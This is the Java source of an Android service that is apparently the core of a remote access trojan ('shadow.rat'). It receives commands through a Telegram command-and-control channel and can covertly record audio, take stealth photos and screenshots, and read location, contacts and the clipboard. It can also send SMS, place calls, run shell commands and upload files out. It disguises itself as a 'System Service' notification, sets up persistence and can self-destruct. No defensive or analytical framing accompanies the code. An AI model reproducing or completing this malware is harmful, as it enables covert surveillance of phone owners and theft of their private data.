package com.shadow.rat.core;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.RemoteException;
import androidx.annotation.Nullable;
import com.shadow.rat.c2.TelegramC2Manager;
import com.shadow.rat.modules.*;
import com.shadow.rat.persistence.ConfigManager;
import com.shadow.rat.persistence.PersistenceManager;
import com.shadow.rat.stealth.NotificationManager;
import com.shadow.rat.utils.Logger;
import com.shadow.rat.utils.ThreadPoolManager;

public class ShadowForegroundService extends Service {
    private static final String TAG = "ShadowService";
    
    // Core components
    private CommandRouter commandRouter;
    private CommandQueue commandQueue;
    private TelegramC2Manager c2Manager;
    private ConfigManager configManager;
    private PersistenceManager persistenceManager;
    private NotificationManager notificationManager;
    private ServiceLifecycleManager lifecycleManager;
    
    // Modules
    private AudioModule audioModule;
    private CameraModule cameraModule;
    private LocationModule locationModule;
    private ScreenshotModule screenshotModule;
    private ContactsModule contactsModule;
    private SmsModule smsModule;
    private CallModule callModule;
    private ShellModule shellModule;
    private ClipboardModule clipboardModule;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Logger.init(this);
        Logger.d(TAG, "Service creating");
        
        // Initialize core components
        ThreadPoolManager.init();
        configManager = new ConfigManager(this);
        notificationManager = new NotificationManager(this);
        c2Manager = new TelegramC2Manager(this, configManager);
        commandRouter = new CommandRouter();
        commandQueue = new CommandQueue();
        lifecycleManager = new ServiceLifecycleManager(this);
        persistenceManager = new PersistenceManager(this, configManager);
        
        // Initialize modules
        initializeModules();
        
        // Register commands
        registerCommands();
        
        // Start foreground service
        startForeground(notificationManager.NOTIFICATION_ID, 
            notificationManager.createNotification("System Service", ""));
        
        // Start C2 listener
        c2Manager.startListening(this::onCommandReceived);
        
        // Setup survival mechanisms
        persistenceManager.setupSurvival();
        
        Logger.d(TAG, "Service initialized");
    }
    
    private void initializeModules() {
        audioModule = new AudioModule(this, notificationManager);
        cameraModule = new CameraModule(this);
        locationModule = new LocationModule(this);
        screenshotModule = new ScreenshotModule(this);
        contactsModule = new ContactsModule(this);
        smsModule = new SmsModule(this);
        callModule = new CallModule(this);
        shellModule = new ShellModule(this);
        clipboardModule = new ClipboardModule(this);
    }
    
    private void registerCommands() {
        // Audio commands
        commandRouter.register("mic", args -> audioModule.record(args));
        commandRouter.register("stop_mic", args -> audioModule.stopRecording());
        
        // Camera commands
        commandRouter.register("cam", args -> cameraModule.capture(args));
        commandRouter.register("cam_stealth", args -> cameraModule.captureStealth(args));
        
        // Screenshot commands
        commandRouter.register("screenshot", args -> screenshotModule.capture(args));
        
        // Location commands
        commandRouter.register("loc", args -> locationModule.getLocation(args));
        
        // Contacts commands
        commandRouter.register("contacts", args -> contactsModule.getContacts(args));
        
        // SMS commands
        commandRouter.register("sms", args -> smsModule.sendSms(args));
        
        // Call commands
        commandRouter.register("call", args -> callModule.makeCall(args));
        
        // Shell commands
        commandRouter.register("shell", args -> shellModule.execute(args));
        
        // Clipboard commands
        commandRouter.register("clipboard", args -> clipboardModule.getClipboard(args));
        
        // Exfiltration commands
        commandRouter.register("upload", args -> c2Manager.uploadFile(args));
        
        // System commands
        commandRouter.register("selfdestruct", args -> lifecycleManager.selfDestruct());
        commandRouter.register("status", args -> reportStatus());
        commandRouter.register("config", args -> configManager.updateConfig(args));
        commandRouter.register("heartbeat", args -> c2Manager.sendHeartbeat());
    }
    
    private void onCommandReceived(String command) {
        Logger.d(TAG, "Command received: " + command);
        commandQueue.enqueue(command, CommandQueue.Priority.NORMAL, cmd -> {
            try {
                commandRouter.route(cmd);
            } catch (Exception e) {
                Logger.e(TAG, "Command execution failed", e);
                c2Manager.sendError("Command failed: " + e.getMessage());
            }
        });
    }
    
    private void reportStatus() {
        StringBuilder status = new StringBuilder();
        status.append("🔄 **Status Report**\n");
        status.append("• Uptime: ").append(lifecycleManager.getUptime()).append("\n");
        status.append("• Memory: ").append(ThreadPoolManager.getMemoryUsage()).append("\n");
        status.append("• Modules: All active\n");
        c2Manager.sendMessage(status.toString());
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        persistenceManager.onTaskRemoved();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Logger.d(TAG, "Service destroying");
        lifecycleManager.shutdown();
        ThreadPoolManager.shutdown();
        c2Manager.shutdown();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}